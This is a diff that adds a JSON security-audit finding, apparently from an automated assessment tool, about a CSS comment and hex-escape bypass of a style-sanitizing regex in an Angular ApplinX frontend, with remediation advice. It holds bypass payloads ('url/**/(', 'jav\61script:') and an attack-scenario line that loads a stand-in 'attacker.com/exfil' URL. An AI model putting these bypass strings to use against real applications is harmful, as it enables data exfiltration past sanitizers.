@@ -1,0 +1,90 @@
+{
+  "$schema": "../../../../d4rthb0b/schemas/vulnerability-investigation.schema.json",
+  "schema_version": "1.0",
+  "phase": "inquisitor",
+  "vulnerability_id": "VULN-002",
+  "descriptor": "css-comment-injection-bypass",
+  "assessment_id": "2026-08-02-20-57",
+  "metadata": {
+    "investigated": "2026-08-02T22:00:00Z",
+    "analyst": "D4rthB0b-Inquisitor",
+    "status": "confirmed"
+  },
+  "investigation": {
+    "confirmed_at": "2026-08-02T22:00:00Z",
+    "exploitability": "low",
+    "root_cause": "The getCss() regex filter uses \\s* which does not consume CSS comment sequences (/**/), so 'url/**/(evil)' bypasses the pattern match. Additionally, CSS hex escape sequences (jav\\61script:) normalize at browser render time but not before the regex test. However, the property allowlist (ALLOWED_CSS_PROPS) does not include any property that accepts url() values (no background-image, cursor, border-image), making the bypasses latently exploitable but currently blocked by the allowlist.",
+    "attack_scenario": "Compromised ApplinX backend sends field.style='background-color: url/**/( https://attacker.com/exfil)'. The regex !/url\\s*\\(/.test('background-color: url/**/(') evaluates TRUE (no match), passing the check. If background-image were in ALLOWED_CSS_PROPS, the browser would execute a URL load to the attacker server. Currently blocked because background-image is not in ALLOWED_CSS_PROPS.",
+    "prerequisites": [
+      "ApplinX REST API backend compromised or acting maliciously",
+      "Developer adds a url()-accepting property (background-image, cursor, etc.) to ALLOWED_CSS_PROPS without fixing regex — required for active exploitation",
+      "User loads a screen with a field bearing the malicious style attribute"
+    ],
+    "privilege_boundary": {
+      "start_privilege": "Compromised ApplinX REST API backend",
+      "achieved_privilege": "Same-origin CSS resource load (data exfiltration via URL, limited)",
+      "boundary_crossed": true
+    },
+    "impact": {
+      "confidentiality": "low",
+      "integrity": "none",
+      "availability": "none",
+      "description": "CSS-based data exfiltration is limited (URL parameters only, no JavaScript execution via CSS in modern browsers). expression() is IE6-IE7 only and not a risk in modern browsers. The current allowlist prevents exploitation, but the latent bypass means a single future allowlist change enables attack without further code changes."
+    },
+    "data_flow": {
+      "sources": [
+        "Field.style string from ApplinX REST API GetScreenResponse (server-controlled)"
+      ],
+      "transformations": [
+        "Split by ';' to extract CSS declarations",
+        "Extract property (before ':') and value (after ':'), trim whitespace",
+        "ALLOWED_CSS_PROPS allowlist check — primary gate (effective)",
+        "Regex filter !/url\\s*\\(|expression\\s*\\(|javascript\\s*:/i — secondary gate (bypassable via CSS comments and hex escapes)",
+        "Angular [style]='getCss()' binding — no additional sanitization for STYLE context"
+      ],
+      "sinks": [
+        "Inline style attribute on FieldComponent <div> element",
+        "Inline style attribute on InputFieldComponent <input> element",
+        "Browser CSS parser normalizes comments and escapes at render time"
+      ]
+    }
+  },
+  "affected_components": {
+    "direct": [
+      {
+        "component": "FieldComponent.getCss()",
+        "impact": "Regex filter bypassable; allowlist is primary defense"
+      },
+      {
+        "component": "InputFieldComponent.getCss()",
+        "impact": "Identical implementation — same bypass applies"
+      }
+    ],
+    "indirect": [
+      {
+        "component": "Future allowlist additions",
+        "impact": "If background-image or cursor added to ALLOWED_CSS_PROPS, bypass becomes immediately exploitable without code review catching it"
+      }
+    ]
+  },
+  "remediation_guidance": {
+    "recommended_fix": "Pre-normalize CSS values before regex test: (1) Strip CSS comments: value.replace(/\\/\\*.*?\\*\\//gs, ''). (2) Normalize CSS hex escapes before testing. (3) Consider per-property value validators (e.g., color accepts only #hex, rgb(), named colors) to eliminate the regex entirely and use strict value allowlisting.",
+    "priority": "medium",
+    "defense_in_depth": [
+      "Strip CSS comments from values before regex check: value.replace(/\\/\\*.*?\\*\\//gs, '')",
+      "Normalize CSS hex escapes before regex: replace \\XX hex sequences with decoded chars",
+      "Consider strict per-property value validators (regex per property type) instead of generic regex",
+      "Synchronize allowlist between FieldComponent and InputFieldComponent (currently duplicated — future divergence risk)",
+      "Add integration test: verify CSS comment and hex escape inputs are blocked"
+    ]
+  },
+  "references": {
+    "scan_finding": "VULN-002-S-scan-finding.md",
+    "threat_model": ["TM-003"],
+    "attack_surface": ["AS-001", "AS-004"],
+    "external": [
+      "CSS Comments in property values: https://www.w3.org/TR/CSS21/syndata.html#comments",
+      "CSS Unicode escapes: https://www.w3.org/TR/CSS21/syndata.html#escaped-characters"
+    ]
+  }
+}
